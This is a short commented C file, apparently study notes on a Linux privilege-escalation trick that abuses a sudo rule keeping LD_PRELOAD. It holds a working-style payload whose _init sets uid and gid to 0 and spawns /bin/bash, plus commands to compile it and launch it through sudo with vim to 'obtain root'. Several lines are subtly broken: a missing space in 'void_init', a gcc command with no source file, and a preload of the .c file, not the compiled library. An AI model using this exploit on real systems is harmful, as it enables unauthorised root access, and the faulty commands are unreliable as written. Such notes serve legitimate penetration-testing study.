// use 'sudo -l' to check if user account privilige includes LD_PRELOAD (pre-loading of a dynamic linker on UNIX systems)
// what is LD_PRELOAD: preloads custom shared libraries before others during program execution, enabling you to override or extend functionality. 



//  craft a malicious .c file that will load in LD_PRELOAD before all other libraries
// then compile it: gcc -shared -fPIC -shared -o maliciousfile.c -nostartfiles
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void_init(){
  unsetenv("LD_PRELOAD");
  setgid(0);    // root has a gid and uid of 0 
  setuid(0);
  system("/bin/bash");    // tells system to execute /bin/bash
}




// execute maliciousfile.c using the LD_PRELOAD tool, the full path of the malicious .c file, and any binary that the account has sudo priviliges on ie. vim, nano etc.
// sudo LD_PRELOAD=/full/path/maliciousfile.c vim
// obtain root
